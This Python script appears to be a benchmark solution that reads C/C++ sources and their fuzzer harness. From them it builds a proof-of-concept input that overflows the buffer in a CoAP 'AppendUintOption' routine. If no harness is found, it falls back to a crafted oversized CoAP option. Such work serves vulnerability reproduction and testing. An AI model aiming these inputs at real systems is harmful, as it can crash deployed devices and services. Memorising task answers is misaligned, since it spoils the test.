import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


_C_EXTS = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp")


def _read_text_file(path: str, max_bytes: int = 2_000_000) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size > max_bytes:
            return None
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return None
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _scan_dir_sources(root: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    for base, _, files in os.walk(root):
        for fn in files:
            if not fn.lower().endswith(_C_EXTS):
                continue
            p = os.path.join(base, fn)
            txt = _read_text_file(p)
            if txt is not None and txt:
                rel = os.path.relpath(p, root)
                out[rel] = txt
    return out


def _scan_tar_sources(tar_path: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not name.lower().endswith(_C_EXTS):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    if not data:
                        continue
                    txt = data.decode("utf-8", errors="ignore")
                    if txt:
                        out[name] = txt
                except Exception:
                    continue
    except Exception:
        return {}
    return out


def _strip_comments_and_strings(s: str) -> str:
    n = len(s)
    i = 0
    out_chars: List[str] = []
    in_line = False
    in_block = False
    in_sq = False
    in_dq = False
    escape = False
    while i < n:
        c = s[i]
        nxt = s[i + 1] if i + 1 < n else ""
        if in_line:
            if c == "\n":
                in_line = False
                out_chars.append("\n")
            else:
                out_chars.append(" ")
            i += 1
            continue
        if in_block:
            if c == "*" and nxt == "/":
                in_block = False
                out_chars.append("  ")
                i += 2
            else:
                out_chars.append("\n" if c == "\n" else " ")
                i += 1
            continue
        if in_sq:
            if escape:
                escape = False
                out_chars.append(" ")
                i += 1
                continue
            if c == "\\":
                escape = True
                out_chars.append(" ")
                i += 1
                continue
            if c == "'":
                in_sq = False
            out_chars.append(" " if c != "\n" else "\n")
            i += 1
            continue
        if in_dq:
            if escape:
                escape = False
                out_chars.append(" ")
                i += 1
                continue
            if c == "\\":
                escape = True
                out_chars.append(" ")
                i += 1
                continue
            if c == '"':
                in_dq = False
            out_chars.append(" " if c != "\n" else "\n")
            i += 1
            continue

        if c == "/" and nxt == "/":
            in_line = True
            out_chars.append("  ")
            i += 2
            continue
        if c == "/" and nxt == "*":
            in_block = True
            out_chars.append("  ")
            i += 2
            continue
        if c == "'":
            in_sq = True
            out_chars.append(" ")
            i += 1
            continue
        if c == '"':
            in_dq = True
            out_chars.append(" ")
            i += 1
            continue

        out_chars.append(c)
        i += 1
    return "".join(out_chars)


def _find_matching(s: str, open_pos: int, open_ch: str, close_ch: str) -> Optional[int]:
    if open_pos < 0 or open_pos >= len(s) or s[open_pos] != open_ch:
        return None
    depth = 0
    for i in range(open_pos, len(s)):
        if s[i] == open_ch:
            depth += 1
        elif s[i] == close_ch:
            depth -= 1
            if depth == 0:
                return i
    return None


def _sizeof_type(t: str) -> Optional[int]:
    tt = " ".join(t.strip().split())
    tt = tt.replace("std::", "")
    tt = tt.replace("const ", "").replace("volatile ", "")
    tt = tt.replace("&", "").replace("*", "").strip()

    m = re.match(r"u?int(\d+)_t$", tt)
    if m:
        bits = int(m.group(1))
        if bits % 8 == 0:
            return bits // 8
    if tt in ("size_t",):
        return 8
    if tt in ("bool",):
        return 1
    if tt in ("char", "signed char", "unsigned char"):
        return 1
    if tt in ("short", "short int", "signed short", "signed short int", "unsigned short", "unsigned short int"):
        return 2
    if tt in ("int", "signed", "signed int", "unsigned", "unsigned int"):
        return 4
    if tt in ("long", "long int", "signed long", "signed long int", "unsigned long", "unsigned long int"):
        return 8
    if tt in (
        "long long",
        "long long int",
        "signed long long",
        "signed long long int",
        "unsigned long long",
        "unsigned long long int",
    ):
        return 8
    return None


def _eval_array_size(expr: str) -> Optional[int]:
    e = expr.strip()
    if re.fullmatch(r"\d+", e):
        return int(e)
    m = re.fullmatch(r"sizeof\s*\(\s*([^)]+?)\s*\)", e)
    if m:
        sz = _sizeof_type(m.group(1))
        return sz
    return None


def _extract_function_body(text: str, name: str) -> Optional[str]:
    clean = _strip_comments_and_strings(text)
    idx = clean.find(name)
    while idx != -1:
        par = clean.find("(", idx)
        if par == -1:
            return None
        br = clean.find("{", par)
        if br == -1:
            idx = clean.find(name, idx + len(name))
            continue
        end = _find_matching(clean, br, "{", "}")
        if end is None:
            return None
        return text[br : end + 1]
    return None


def _guess_append_uint_buf_size(sources: Dict[str, str]) -> int:
    candidates: List[int] = []
    for _, txt in sources.items():
        if "AppendUintOption" not in txt:
            continue
        body = _extract_function_body(txt, "AppendUintOption")
        if not body:
            continue
        for m in re.finditer(r"\buint8_t\s+\w+\s*\[\s*([^\]]+)\s*\]", body):
            sz = _eval_array_size(m.group(1))
            if sz is not None and 1 <= sz <= 16:
                candidates.append(sz)
        for m in re.finditer(r"\buint8\s+\w+\s*\[\s*([^\]]+)\s*\]", body):
            sz = _eval_array_size(m.group(1))
            if sz is not None and 1 <= sz <= 16:
                candidates.append(sz)
    for target in (4, 2, 8, 3, 5, 6, 7, 1):
        if target in candidates:
            return target
    if candidates:
        return min(candidates)
    return 4


def _parse_enum_defs(text: str) -> Dict[str, Dict[str, int]]:
    clean = _strip_comments_and_strings(text)
    enums: Dict[str, Dict[str, int]] = {}
    for m in re.finditer(r"\benum\b\s*(class\s+)?(\w+)\s*(?::\s*([^{\s]+)\s*)?\{", clean):
        enum_name = m.group(2)
        start = m.end() - 1
        end = _find_matching(clean, start, "{", "}")
        if end is None:
            continue
        block = clean[start + 1 : end]
        items = [x.strip() for x in block.split(",")]
        cur = 0
        mapping: Dict[str, int] = {}
        for it in items:
            if not it:
                continue
            it = re.sub(r"\s+", " ", it)
            mm = re.match(r"(\w+)\s*(?:=\s*([^,\s/]+))?", it)
            if not mm:
                continue
            name = mm.group(1)
            val_s = mm.group(2)
            if val_s is not None:
                try:
                    if val_s.lower().startswith("0x"):
                        cur = int(val_s, 16)
                    else:
                        cur = int(val_s, 10)
                except Exception:
                    pass
            mapping[name] = cur
            cur += 1
        if mapping:
            enums[enum_name] = mapping
    return enums


def _extract_statement(text: str, pos: int) -> Optional[str]:
    semi = text.find(";", pos)
    if semi == -1:
        return None
    start = text.rfind("\n", 0, pos)
    if start == -1:
        start = 0
    else:
        start += 1
    return text[start : semi + 1]


def _find_fuzzer_file(sources: Dict[str, str]) -> Optional[Tuple[str, str]]:
    best = None
    for fn, txt in sources.items():
        if "LLVMFuzzerTestOneInput" in txt and "AppendUintOption" in txt:
            return (fn, txt)
        if "LLVMFuzzerTestOneInput" in txt:
            best = (fn, txt)
    return best


def _extract_fuzzer_body(text: str) -> Optional[str]:
    clean = _strip_comments_and_strings(text)
    m = re.search(r"\bLLVMFuzzerTestOneInput\s*\(", clean)
    if not m:
        return None
    br = clean.find("{", m.end())
    if br == -1:
        return None
    end = _find_matching(clean, br, "{", "}")
    if end is None:
        return None
    return text[br + 1 : end]


def _guess_selector_case_value(fuzzer_body: str, full_text: str) -> Optional[int]:
    if "AppendUintOption" not in fuzzer_body:
        return None
    clean_body = _strip_comments_and_strings(fuzzer_body)
    call_pos = clean_body.find("AppendUintOption")
    if call_pos == -1:
        return None
    sw_pos = clean_body.rfind("switch", 0, call_pos)
    if sw_pos == -1:
        return None
    seg = clean_body[sw_pos:call_pos]
    cases = list(re.finditer(r"\bcase\s+([^:]+)\s*:", seg))
    if not cases:
        return None
    case_expr = cases[-1].group(1).strip()
    if re.fullmatch(r"(0x[0-9a-fA-F]+|\d+)", case_expr):
        return int(case_expr, 0)
    m = re.fullmatch(r"(\w+)::(\w+)", case_expr)
    if m:
        enum_name, member = m.group(1), m.group(2)
        enums = _parse_enum_defs(full_text)
        if enum_name in enums and member in enums[enum_name]:
            return enums[enum_name][member]
    m = re.fullmatch(r"(\w+)", case_expr)
    if m:
        member = m.group(1)
        enums = _parse_enum_defs(full_text)
        for _, mp in enums.items():
            if member in mp:
                return mp[member]
    return None


def _guess_switch_selector_expr(fuzzer_body: str) -> Optional[Tuple[str, int, int, int]]:
    clean = _strip_comments_and_strings(fuzzer_body)
    m = re.search(r"\bswitch\s*\(", clean)
    if not m:
        return None
    par_open = clean.find("(", m.start())
    par_close = _find_matching(clean, par_open, "(", ")") if par_open != -1 else None
    if par_close is None:
        return None
    expr = clean[par_open + 1 : par_close].strip()
    tsize = 1
    minv = 0
    modv = None

    m2 = re.search(r"ConsumeIntegralInRange\s*<\s*([^>]+)\s*>\s*\(\s*([^,]+)\s*,\s*([^)]+)\)", expr)
    if m2:
        t = m2.group(1).strip()
        tsize = _sizeof_type(t) or 1
        try:
            minv = int(m2.group(2).strip(), 0)
            maxv = int(m2.group(3).strip(), 0)
            modv = maxv - minv + 1
        except Exception:
            minv = 0
            modv = None
        return (expr, tsize, minv, modv or 256)

    m2 = re.search(r"ConsumeIntegral\s*<\s*([^>]+)\s*>\s*\(", expr)
    if m2:
        t = m2.group(1).strip()
        tsize = _sizeof_type(t) or 1
        m3 = re.search(r"%\s*([0-9]+)", expr)
        if m3:
            modv = int(m3.group(1), 10)
        else:
            modv = 1 << (8 * tsize)
        return (expr, tsize, 0, modv)

    m2 = re.search(r"ConsumeEnum\s*<\s*([^>]+)\s*>\s*\(", expr)
    if m2:
        tsize = 1
        modv = 256
        return (expr, tsize, 0, modv)

    return None


def _synthesize_fdp_poc(sources: Dict[str, str], buf_size: int) -> Optional[bytes]:
    fz = _find_fuzzer_file(sources)
    if not fz:
        return None
    fn, txt = fz
    body = _extract_fuzzer_body(txt)
    if not body or "AppendUintOption" not in body:
        return None

    if "FuzzedDataProvider" not in txt and "fuzzed_data_provider" not in txt and "ConsumeIntegral" not in txt:
        return None

    clean_body = _strip_comments_and_strings(body)
    call_pos = clean_body.find("AppendUintOption")
    if call_pos == -1:
        return None

    stmt = _extract_statement(body, body.find("AppendUintOption"))
    if not stmt:
        stmt = body[body.find("AppendUintOption") : body.find("AppendUintOption") + 200]
    if stmt is None:
        return None

    stmt_clean = _strip_comments_and_strings(stmt)
    arg_consumes = list(re.finditer(r"ConsumeIntegral\s*<\s*([^>]+)\s*>", stmt_clean))
    if len(arg_consumes) < 1:
        arg_consumes = list(re.finditer(r"ConsumeIntegralInRange\s*<\s*([^>]+)\s*>", stmt_clean))
    if len(arg_consumes) < 1:
        return None

    consumes: List[Tuple[str, int]] = []
    for m in re.finditer(r"(ConsumeIntegralInRange|ConsumeIntegral|ConsumeBool|ConsumeEnum)\s*(?:<\s*([^>]+)\s*>)?\s*\(", stmt_clean):
        kind = m.group(1)
        ty = (m.group(2) or "").strip()
        if kind == "ConsumeBool":
            consumes.append((kind, 1))
        elif kind == "ConsumeEnum":
            consumes.append((kind, 1))
        else:
            sz = _sizeof_type(ty) or 1
            consumes.append((kind, sz))

    value = 1 << (8 * buf_size) if buf_size < 8 else (1 << 63)
    option_number = 23

    selector_case = _guess_selector_case_value(body, txt)
    selector_info = _guess_switch_selector_expr(body)
    selector_bytes = b""
    if selector_case is not None and selector_info is not None:
        _, tsize, minv, modv = selector_info
        if modv <= 0:
            modv = 256
        raw = (selector_case - minv) % modv
        selector_bytes = int(raw).to_bytes(tsize, "little", signed=False)
    else:
        selector_bytes = b""

    out = bytearray()
    out += selector_bytes

    filled_value = False
    filled_number = False

    for kind, sz in consumes:
        if not filled_number and sz == 2:
            out += int(option_number).to_bytes(2, "little", signed=False)
            filled_number = True
            continue
        if not filled_value and sz >= 4:
            v = value & ((1 << (8 * sz)) - 1) if sz < 8 else value
            out += int(v).to_bytes(sz, "little", signed=False)
            filled_value = True
            continue
        out += b"\x00" * sz

    if not filled_value:
        out += int(value).to_bytes(8, "little", signed=False)

    if len(out) < 12:
        out += b"\x00" * (12 - len(out))

    return bytes(out)


def _encode_coap_ext(v: int) -> Tuple[int, bytes]:
    if v <= 12:
        return v, b""
    if v <= 268:
        return 13, bytes([v - 13])
    if v <= 65804:
        x = v - 269
        return 14, x.to_bytes(2, "big")
    return 14, (65804 - 269).to_bytes(2, "big")


def _build_coap_message_with_uint_option(option_number: int, buf_size: int) -> bytes:
    tkl = 7
    ver_type_tkl = 0x40 | tkl
    code = 0x01
    mid = b"\x00\x00"
    token = b"\x00" * tkl

    value = 1 << (8 * buf_size) if buf_size < 8 else (1 << 63)
    opt_value = int(value).to_bytes(8, "big", signed=False)

    delta = option_number
    length = len(opt_value)

    dn, de = _encode_coap_ext(delta)
    ln, le = _encode_coap_ext(length)
    first = bytes([(dn << 4) | ln])
    option = first + de + le + opt_value
    return bytes([ver_type_tkl, code]) + mid + token + option


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            sources = _scan_dir_sources(src_path)
        else:
            sources = _scan_tar_sources(src_path)

        buf_size = _guess_append_uint_buf_size(sources)

        poc = _synthesize_fdp_poc(sources, buf_size)
        if poc is not None:
            return poc

        return _build_coap_message_with_uint_option(23, buf_size)